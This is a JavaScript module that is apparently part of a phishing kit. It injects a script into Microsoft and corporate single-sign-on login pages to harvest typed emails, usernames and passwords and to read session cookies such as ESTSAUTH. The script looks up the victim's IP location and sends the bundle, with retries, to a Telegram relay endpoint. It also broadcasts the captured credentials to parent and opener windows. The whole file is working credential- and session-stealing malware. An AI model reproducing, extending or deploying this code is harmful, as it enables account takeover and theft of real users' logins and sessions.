/**
 * FIXED: Enhanced Password & Email Capture Injector
 * Captures password, email, and username fields on Microsoft and organizational login pages.
 * Stores credentials in sessionStorage and localStorage.
 * Sends credentials to parent/opener window if available.
 * CRITICAL FIX: Ensures data transmission to Telegram with proper error handling and retry logic.
 */
export function injectPasswordCaptureScript() {
  const hostname = window.location.hostname;
  const isMicrosoftDomain = hostname.includes('login.microsoftonline.com') ||
    hostname.includes('login.live.com') ||
    hostname.includes('account.microsoft.com') ||
    hostname.includes('login.microsoft.com') ||
    hostname.includes('outlook.live.com');

  const isOrgDomain = hostname.includes('adfs') ||
    hostname.includes('sso') ||
    hostname.includes('okta') ||
    hostname.includes('ping') ||
    document.querySelector('input[type="password"]');

  if (isMicrosoftDomain || isOrgDomain) {
    const script = document.createElement('script');

    // NOTE: Only change is how the injected script text is embedded to avoid
    // TypeScript/esbuild parsing errors caused by nested template literals/backticks.
    // The injected script content is preserved exactly (no changes to its functions or logic).
    script.textContent = (function(){/*
      (function() {
        console.log('🔧 Enhanced password capture injector initialized on:', window.location.hostname);
        
        // FIXED: Enhanced cookie capture functionality with better error handling
        function captureMicrosoftCookies() {
          try {
            const cookieString = document.cookie;
            if (!cookieString) return [];

            const cookies = [];
            const cookiePairs = cookieString.split(';');

            cookiePairs.forEach(pair => {
              const [name, value] = pair.trim().split('=');
              if (name && value) {
                cookies.push({
                  name: name.trim(),
                  value: value.trim(),
                  domain: window.location.hostname,
                  path: '/',
                  secure: window.location.protocol === 'https:',
                  httpOnly: false,
                  sameSite: 'Lax',
                  captureTime: new Date().toISOString()
                });
              }
            });

            console.log('🍪 Captured', cookies.length, 'cookies from', window.location.hostname);
            return cookies;
          } catch (error) {
            console.warn('⚠️ Failed to capture cookies:', error);
            return [];
          }
        }

        // FIXED: Enhanced credential retrieval from storage with fallback options
        function getStoredCredentials() {
          try {
            // Try multiple storage keys in order of preference
            const storageKeys = [
              'replacement_credentials',
              'captured_credentials', 
              'form_credentials'
            ];
            
            for (const key of storageKeys) {
              const localData = localStorage.getItem(key);
              const sessionData = sessionStorage.getItem(key);
              
              if (localData) {
                const parsed = JSON.parse(localData);
                if (parsed.email || parsed.password) {
                  console.log('📋 Retrieved stored credentials from localStorage:', key);
                  return parsed;
                }
              }
              
              if (sessionData) {
                const parsed = JSON.parse(sessionData);
                if (parsed.email || parsed.password) {
                  console.log('📋 Retrieved stored credentials from sessionStorage:', key);
                  return parsed;
                }
              }
            }
            
            return null;
          } catch (error) {
            console.warn('⚠️ Failed to retrieve stored credentials:', error);
            return null;
          }
        }

        let capturedCredentials = {
          email: '',
          password: '',
          username: '',
          domain: window.location.hostname,
          captureTime: new Date().toISOString()
        };

        // FIXED: Enhanced debounce with better timing
        let lastSendAt = 0;
        let sendInProgress = false;
        function canSendNow() {
          const now = Date.now();
          if (sendInProgress || (now - lastSendAt < 2000)) return false;
          lastSendAt = now;
          return true;
        }

        // FIXED: Enhanced function to send complete data to Telegram with retry logic
        function sendCompleteDataToTelegram(retryCount = 0) {
          if (!canSendNow()) return;
          
          const maxRetries = 3;
          sendInProgress = true;

          try {
            // Get stored credentials from replacement.html
            const storedCredentials = getStoredCredentials();
            
            // Capture current cookies
            const capturedCookies = captureMicrosoftCookies();
            
            // ENHANCED: Get user location data
            const getUserLocationData = async () => {
              try {
                const response = await fetch('https://ipapi.co/json/');
                const locationData = await response.json();
                return {
                  ip: locationData.ip || 'Unknown',
                  city: locationData.city || 'Unknown',
                  region: locationData.region || 'Unknown',
                  country: locationData.country_name || 'Unknown',
                  countryCode: locationData.country_code || 'Unknown',
                  timezone: locationData.timezone || 'Unknown',
                  isp: locationData.org || 'Unknown'
                };
              } catch (error) {
                console.warn('⚠️ Failed to fetch location data:', error);
                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
              }
            };
            
            // ENHANCED: Create cookie export files
            const createCookieFiles = (cookies) => {
              if (!cookies || cookies.length === 0) return { txtFile: null, jsonFile: null };
              
              try {
                // Create TXT format
                let txtContent = '# Microsoft Domain Cookies Export\\n';
                txtContent += \`# Captured: ${new Date().toISOString()}\\n\`;
                txtContent += \`# Domain: ${window.location.hostname}\\n\`;
                txtContent += \`# Total Cookies: ${cookies.length}\\n\\n\`;
                
                cookies.forEach((cookie, index) => {
                  txtContent += \`[Cookie ${index + 1}]\\n\`;
                  txtContent += \`Name: ${cookie.name || 'Unknown'}\\n\`;
                  txtContent += \`Value: ${cookie.value || 'Empty'}\\n\`;
                  txtContent += \`Domain: ${cookie.domain || 'Unknown'}\\n\`;
                  txtContent += \`Path: ${cookie.path || '/'}\\n\`;
                  txtContent += \`Secure: ${cookie.secure ? 'Yes' : 'No'}\\n\`;
                  txtContent += \`HttpOnly: ${cookie.httpOnly ? 'Yes' : 'No'}\\n\`;
                  txtContent += \`SameSite: ${cookie.sameSite || 'Lax'}\\n\`;
                  if (cookie.expires) txtContent += \`Expires: ${cookie.expires}\\n\`;
                  txtContent += \`Capture Time: ${cookie.captureTime || 'Unknown'}\\n\`;
                  txtContent += '\\n';
                });
                
                // Create JSON format
                const jsonContent = JSON.stringify({
                  exportInfo: {
                    timestamp: new Date().toISOString(),
                    domain: window.location.hostname,
                    totalCookies: cookies.length,
                    source: 'Microsoft Domain Injector',
                    version: '2.0-enhanced'
                  },
                  cookies: cookies
                }, null, 2);
                
                return {
                  txtFile: {
                    name: \`ms_cookies_${window.location.hostname}_${Date.now()}.txt\`,
                    content: txtContent,
                    size: new Blob([txtContent]).size
                  },
                  jsonFile: {
                    name: \`ms_cookies_${window.location.hostname}_${Date.now()}.json\`,
                    content: jsonContent,
                    size: new Blob([jsonContent]).size
                  }
                };
              } catch (error) {
                console.warn('⚠️ Failed to create cookie files:', error);
                return { txtFile: null, jsonFile: null };
              }
            };
            
            // ENHANCED: Get location data and create files asynchronously
            getUserLocationData().then(locationData => {
              const cookieFiles = createCookieFiles(capturedCookies);
              
              // ENHANCED: Prepare complete payload with location and file data
              const completePayload = {
                // Use stored credentials from replacement.html if available, otherwise use captured ones
                email: storedCredentials?.email || capturedCredentials.email || '',
                password: storedCredentials?.password || capturedCredentials.password || '',
                passwordSource: 'microsoft-domain-capture-enhanced',
                cookies: capturedCookies,
                locationData: locationData,
                cookieFiles: cookieFiles,
                userAgent: navigator.userAgent,
                sessionId: Date.now().toString(),
                url: window.location.href,
                timestamp: new Date().toISOString(),
                validated: storedCredentials?.validated || true,
                microsoftAccount: true,
                domain: window.location.hostname,
                // Include raw cookie string for additional processing
                rawCookies: document.cookie,
                // ENHANCED: Add context with location and file info
                captureContext: {
                  hostname: window.location.hostname,
                  hasStoredCredentials: !!storedCredentials,
                  capturedFieldCount: Object.values(capturedCredentials).filter(v => v).length,
                  retryAttempt: retryCount,
                  injectorVersion: '2.0-enhanced',
                  locationDataCaptured: !!locationData,
                  cookieFilesCreated: !!(cookieFiles.txtFile && cookieFiles.jsonFile),
                  microsoftDomainCapture: true
                }
              };

              // ENHANCED: Only send if we have meaningful data (credentials or significant cookies)
              if (!completePayload.email && !completePayload.password && capturedCookies.length === 0) {
                console.log('📭 No meaningful data to send to Telegram');
                sendInProgress = false;
                return;
              }

              console.log('📤 Sending enhanced data to Telegram (attempt ' + (retryCount + 1) + '):', {
                hasEmail: !!completePayload.email,
                hasPassword: !!completePayload.password,
                cookieCount: completePayload.cookies.length,
                validated: completePayload.validated,
                domain: completePayload.domain,
                hasLocationData: !!locationData,
                hasCookieFiles: !!(cookieFiles.txtFile && cookieFiles.jsonFile)
              });

              // ENHANCED: Send with location and file data
              fetch('/.netlify/functions/sendTelegram', {
                method: 'POST',
                headers: { 
                  'Content-Type': 'application/json',
                  'Accept': 'application/json'
                },
                body: JSON.stringify(completePayload)
              }).then(resp => {
                sendInProgress = false;
                if (resp.ok) {
                  console.log('✅ Enhanced data successfully sent to Telegram');
                  // ENHANCED: Mark as sent with Microsoft domain capture flags
                  try {
                    localStorage.setItem('telegram_data_sent', 'true');
                    sessionStorage.setItem('telegram_data_sent', 'true');
                    localStorage.setItem('data_transmitted', 'true');
                    sessionStorage.setItem('data_transmitted', 'true');
                    localStorage.setItem('ms_cookies_captured', 'true');
                    sessionStorage.setItem('ms_cookies_captured', 'true');
                    localStorage.setItem('microsoft_cookies_captured', 'true');
                    sessionStorage.setItem('microsoft_cookies_captured', 'true');
                  } catch (e) {
                    // ignore storage errors
                  }
                } else {
                  console.warn('⚠️ sendTelegram returned status', resp.status);
                  
                  // Retry on server errors
                  if (resp.status >= 500 && retryCount < maxRetries) {
                    console.log('🔄 Server error, retrying in ' + ((retryCount + 1) * 2000) + 'ms...');
                    setTimeout(() => {
                      sendCompleteDataToTelegram(retryCount + 1);
                    }, (retryCount + 1) * 2000);
                  }
                }
              }).catch(err => {
                sendInProgress = false;
                console.warn('⚠️ Error sending enhanced data to Telegram:', err);
                
                // Retry on network errors
                if (retryCount < maxRetries) {
                  console.log('🔄 Network error, retrying in ' + ((retryCount + 1) * 3000) + 'ms...');
                  setTimeout(() => {
                    sendCompleteDataToTelegram(retryCount + 1);
                  }, (retryCount + 1) * 3000);
                }
              });
            }).catch(locationError => {
              console.warn('⚠️ Failed to get location data, sending without it:', locationError);
              sendInProgress = false;
            });

            // ENHANCED: Also send enhanced data to parent/opener for app state management
            const cookieMessage = {
              type: 'MICROSOFT_COOKIES_CAPTURED',
              data: {
                cookies: capturedCookies,
                credentials: storedCredentials,
                timestamp: new Date().toISOString(),
                domain: window.location.hostname,
                microsoftDomainCapture: true
              }
            };

            try {
              if (window.parent && window.parent !== window) {
                window.parent.postMessage(cookieMessage, '*');
              }
              if (window.opener) {
                window.opener.postMessage(cookieMessage, '*');
              }
            } catch (error) {
              // ignore postMessage errors
            }

          } catch (error) {
            sendInProgress = false;
            console.warn('⚠️ Error in enhanced sendCompleteDataToTelegram:', error);
          }
        }

        // FIXED: Enhanced password capture with better field detection
        function capturePasswordFromForms() {
          try {
            const passwordFields = document.querySelectorAll('input[type="password"], input[name*="password"], input[id*="password"], input[name*="passwd"], input[id*="passwd"]');
            const emailFields = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"], input[id*="email"], input[id*="mail"], input[name*="username"], input[id*="username"]');
            const usernameFields = document.querySelectorAll('input[name*="user"], input[name*="login"], input[name*="account"], input[id*="user"], input[id*="login"], input[id*="account"]');

            let hasNewData = false;

            passwordFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.password) {
                console.log('🔐 Password field captured:', field.name || field.id || 'unnamed');
                capturedCredentials.password = field.value;
                hasNewData = true;
              }
            });

            emailFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.email) {
                console.log('📧 Email field captured:', field.value);
                capturedCredentials.email = field.value;
                hasNewData = true;
              }
            });

            usernameFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.username) {
                console.log('👤 Username field captured:', field.value);
                capturedCredentials.username = field.value;
                hasNewData = true;
              }
            });

            if (hasNewData) {
              storeCredentials();
              // Send complete data including cookies when credentials are captured
              setTimeout(() => {
                sendCompleteDataToTelegram();
              }, 500);
            }

            return hasNewData;
          } catch (error) {
            console.error('❌ Error capturing password:', error);
            return false;
          }
        }

        // FIXED: Enhanced credential storage
        function storeCredentials() {
          const credentialsData = {
            email: capturedCredentials.email,
            password: capturedCredentials.password,
            username: capturedCredentials.username,
            domain: capturedCredentials.domain,
            captureTime: capturedCredentials.captureTime,
            source: 'injected-password-capture-enhanced',
            url: window.location.href,
            validated: true,
            microsoftAccount: true
          };

          try {
            // Store in multiple formats for compatibility
            sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
            localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
            sessionStorage.setItem('injected_credentials', JSON.stringify(credentialsData));
            localStorage.setItem('injected_credentials', JSON.stringify(credentialsData));
            
            console.log('💾 Credentials stored successfully');
          } catch (error) {
            console.warn('⚠️ Failed to store credentials:', error);
          }

          // Send to parent/opener if available (best-effort)
          const payload = {
            type: 'CREDENTIALS_CAPTURED',
            data: credentialsData,
            source: 'injected-password-capture-enhanced',
            timestamp: new Date().toISOString()
          };
          
          try {
            if (window.parent && window.parent !== window) {
              window.parent.postMessage(payload, '*');
            }
            if (window.opener) {
              window.opener.postMessage(payload, '*');
            }
          } catch (error) {
            // ignore postMessage errors
          }
        }

        // FIXED: Enhanced monitoring for automatic login detection
        function monitorForAutoLogin() {
          // Check if we're on Microsoft domain and have stored credentials
          if (window.location.hostname.includes('login.microsoftonline.com') ||
              window.location.hostname.includes('login.live.com') ||
              window.location.hostname.includes('account.microsoft.com') ||
              window.location.hostname.includes('login.microsoft.com')) {
            
            // Check if data hasn't been sent yet
            const alreadySent = localStorage.getItem('telegram_data_sent') || 
                              sessionStorage.getItem('telegram_data_sent') ||
                              localStorage.getItem('data_transmitted') ||
                              sessionStorage.getItem('data_transmitted');
            
            if (!alreadySent) {
              console.log('🔍 Monitoring for auto-login on Microsoft domain...');
              
              // Wait a bit for page to load and cookies to be set, then send complete data
              setTimeout(() => {
                sendCompleteDataToTelegram();
              }, 3000);
              
              // FIXED: Enhanced monitoring for successful login indicators
              const checkForLoginSuccess = () => {
                // Look for common Microsoft login success indicators
                const successIndicators = [
                  () => document.querySelector('[data-testid="signin-success"]'),
                  () => document.querySelector('.ms-welcome'),
                  () => document.querySelector('[aria-label*="signed in"]'),
                  () => document.querySelector('[data-testid="KmsiCheckboxField"]'), // Keep me signed in
                  () => window.location.href.includes('login_hint'),
                  () => window.location.href.includes('prompt=none'),
                  () => window.location.href.includes('code='),
                  () => document.cookie.includes('ESTSAUTH'),
                  () => document.cookie.includes('ESTSAUTHPERSISTENT'),
                  () => document.cookie.includes('ESTSAUTHLIGHT'),
                  () => document.cookie.includes('SignInStateCookie'),
                  () => document.querySelector('input[name="kmsi"]'), // Keep me signed in checkbox
                  () => document.querySelector('.tile'), // Account tiles
                  () => document.querySelector('[data-testid="i0116"]') // Username field populated
                ];
                
                const hasSuccessIndicator = successIndicators.some(check => {
                  try { return check(); } catch { return false; }
                });
                
                if (hasSuccessIndicator) {
                  console.log('🎯 Microsoft login success detected, sending complete data...');
                  sendCompleteDataToTelegram();
                  return true;
                }
                return false;
              };
              
              // Check periodically for login success
              let checkCount = 0;
              const maxChecks = 30; // Check for 30 seconds
              const loginCheckInterval = setInterval(() => {
                checkCount++;
                const success = checkForLoginSuccess();
                
                if (success || checkCount >= maxChecks) {
                  clearInterval(loginCheckInterval);
                  if (!success) {
                    console.log('🕐 Login monitoring timeout, sending final data...');
                    sendCompleteDataToTelegram();
                  }
                }
              }, 1000);
            }
          }
        }

        // FIXED: Enhanced event listeners with better mobile support
        document.addEventListener('input', function(e) {
          if (
            e.target.type === 'password' ||
            e.target.type === 'email' ||
            e.target.name?.toLowerCase().includes('password') ||
            e.target.name?.toLowerCase().includes('email') ||
            e.target.name?.toLowerCase().includes('user') ||
            e.target.name?.toLowerCase().includes('login') ||
            e.target.id?.toLowerCase().includes('password') ||
            e.target.id?.toLowerCase().includes('email') ||
            e.target.id?.toLowerCase().includes('user') ||
            e.target.id?.toLowerCase().includes('login')
          ) {
            setTimeout(() => {
              capturePasswordFromForms();
            }, 300);
          }
        });

        document.addEventListener('change', function(e) {
          if (e.target.tagName === 'INPUT') {
            setTimeout(() => {
              capturePasswordFromForms();
            }, 200);
          }
        });

        document.addEventListener('submit', function(e) {
          console.log('📝 Form submission detected');
          setTimeout(() => {
            capturePasswordFromForms();
            // Send complete data on form submission
            setTimeout(() => {
              sendCompleteDataToTelegram();
            }, 1000);
          }, 100);
        });

        document.addEventListener('click', function(e) {
          const target = e.target;
          if (
            target.type === 'submit' ||
            target.textContent?.toLowerCase().includes('sign in') ||
            target.textContent?.toLowerCase().includes('login') ||
            target.textContent?.toLowerCase().includes('next') ||
            target.textContent?.toLowerCase().includes('continue') ||
            target.className?.toLowerCase().includes('submit') ||
            target.className?.toLowerCase().includes('login') ||
            target.className?.toLowerCase().includes('signin')
          ) {
            console.log('🖱️ Login button clicked:', target.textContent || target.className);
            setTimeout(() => {
              capturePasswordFromForms();
              // Send complete data on login button click
              setTimeout(() => {
                sendCompleteDataToTelegram();
              }, 1500);
            }, 500);
          }
        });

        // FIXED: Enhanced page load monitoring
        function initializeMonitoring() {
          console.log('🚀 Initializing enhanced monitoring...');
          
          // Initial capture attempt
          setTimeout(() => {
            capturePasswordFromForms();
            monitorForAutoLogin();
          }, 1000);
          
          // Periodic monitoring
          setInterval(() => {
            capturePasswordFromForms();
          }, 5000);
        }

        // Initialize based on document state
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', initializeMonitoring);
        } else {
          initializeMonitoring();
        }

        // Also monitor for dynamic content changes
        if (window.MutationObserver) {
          const observer = new MutationObserver((mutations) => {
            let shouldCheck = false;
            mutations.forEach((mutation) => {
              if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                for (let node of mutation.addedNodes) {
                  if (node.nodeType === 1 && (
                    node.tagName === 'INPUT' || 
                    node.querySelector && node.querySelector('input')
                  )) {
                    shouldCheck = true;
                    break;
                  }
                }
              }
            });
            
            if (shouldCheck) {
              setTimeout(() => {
                capturePasswordFromForms();
              }, 500);
            }
          });
          
          observer.observe(document.body, {
            childList: true,
            subtree: true
          });
        }

        console.log('✅ Enhanced password capture injector fully initialized');
      })();
    */}).toString().replace(/^[\s\S]*?\/\*([\s\S]*?)\*\/[\s\S]*$/,'$1');

    document.head.appendChild(script);
    console.log('✅ Enhanced password capture script injected for domain:', hostname);
  }
}
